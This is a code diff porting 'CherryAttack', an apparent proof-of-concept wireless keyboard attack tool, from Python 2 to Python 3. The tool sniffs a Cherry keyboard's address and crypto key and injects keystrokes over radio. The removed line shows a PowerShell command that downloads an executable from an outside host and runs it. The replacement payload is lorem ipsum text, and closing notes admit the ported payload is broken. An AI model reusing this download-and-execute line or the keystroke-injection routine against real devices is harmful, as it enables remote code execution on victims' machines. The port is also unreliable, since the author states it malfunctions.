@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -27,8 +27,8 @@
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 """
 
-__version__ = '1.0'
-__author__ = 'Matthias Deeg, Gerhard Klostermeier'
+__version__ = '0.9'
+__author__ = 'Matthias Deeg, Gerhard Klostermeier - python3-port by Einstein2150'
 
 import logging
 import pygame
@@ -42,7 +42,8 @@ from time import sleep, time
 from sys import exit
 
 # constants
-ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
+#ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
+ATTACK_VECTOR   = "Just an input from the hacker :D Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet."
 
 RECORD_BUTTON   = pygame.K_1                # record button
 REPLAY_BUTTON   = pygame.K_2                # replay button
@@ -218,7 +219,7 @@ class CherryAttack():
                 # replay all payloads
                 for p in payloadList:
                     # transmit payload
-                    self.radio.transmit_payload(p.tostring())
+                    self.radio.transmit_payload(p.tobytes())
 
                     # info output
                     info('Sent payload: {0}'.format(hexlify(p)))
@@ -255,10 +256,10 @@ class CherryAttack():
                         address, payload = value[0:5], value[5:]
 
                         # convert address to string and reverse byte order
-                        converted_address = address[::-1].tostring()
+                        converted_address = address[::-1].tobytes()
 
                         # check if the address most probably belongs to a Cherry keyboard
-                        if ord(converted_address[0]) in range(0x31, 0x3f):
+                        if converted_address[0] in range(0x31, 0x3f):
                             # first fit strategy to find a Cherry keyboard
                             self.address = converted_address
                             break
@@ -306,13 +307,13 @@ class CherryAttack():
 
                 self.radio.receive_payload()
 
-                self.showText(u"Got crypto key!")
+                self.showText("Got crypto key!")
 
                 # info output
                 info('Got crypto key!')
 
                 # initialize keyboard
-                self.kbd = keyboard.CherryKeyboard(payload.tostring())
+                self.kbd = keyboard.CherryKeyboard(payload.tobytes())
                 info('Initialize keyboard')
 
                 # set IDLE state after scanning
@@ -321,6 +322,7 @@ class CherryAttack():
             elif self.state == ATTACK:
                 if self.kbd != None:
                     # send keystrokes for a classic download and execute PoC attack
+                    '''
                     keystrokes = []
                     keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
                     keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
@@ -331,13 +333,13 @@ class CherryAttack():
                         self.radio.transmit_payload(k)
 
                         # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
+ #                       info('Sent payload: {0}'.format(hexlify(k)))
 
                         sleep(KEYSTROKE_DELAY)
 
                     # need small delay after WIN + R
                     sleep(0.2)
-
+'''
                     keystrokes = []
                     keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
                     keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
@@ -347,7 +349,7 @@ class CherryAttack():
                         self.radio.transmit_payload(k)
 
                         # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
+ #                      info('Sent payload: {0}'.format(hexlify(k)))
 
                         sleep(KEYSTROKE_DELAY)
 
@@ -371,3 +373,6 @@ if __name__ == '__main__':
     # done
     info("Done.")
 
+tostring() is since python3.9 not more available. Mapped the code to python3 and moved testing() to to bytes() and removed unnecessary ord()
+
+The payload is actual broken. The keystrokes seems to be malformed because of the conversation between 2to3 above.
